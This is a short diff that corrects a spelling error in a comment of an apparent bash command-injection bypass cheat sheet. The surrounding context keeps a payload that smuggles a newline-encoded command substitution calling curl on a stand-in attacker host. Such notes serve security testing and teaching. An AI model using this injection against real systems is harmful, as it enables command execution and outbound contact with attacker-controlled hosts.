@@ -239,7 +239,7 @@ declare historywords
 ### Bypass potential regexes
 
 ```bash
-# A regex that only allow letters and numbers migth be vulnerable to new line characters
+# A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 
